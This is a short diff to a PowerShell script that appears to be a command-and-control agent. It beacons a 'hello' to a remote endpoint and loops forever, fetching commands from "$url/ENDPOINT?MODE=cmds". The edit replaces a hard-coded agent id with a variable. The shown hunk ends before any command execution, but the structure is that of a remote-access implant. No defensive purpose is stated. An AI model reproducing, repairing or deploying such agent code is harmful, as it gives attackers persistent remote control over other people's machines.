@@ -27,7 +27,7 @@ $hello=(Invoke-WebRequest "$url/ENDPOINT?MODE=res&RESPONSE=$EncHello&id=$id")
 while($true)
 {
 
-$Content=(Invoke-WebRequest "$url/ENDPOINT?MODE=cmds&id=789&o=W").Content
+$Content=(Invoke-WebRequest "$url/ENDPOINT?MODE=cmds&id=$id&o=W").Content
 
 if ([string]::IsNullOrWhiteSpace($Content))
     {
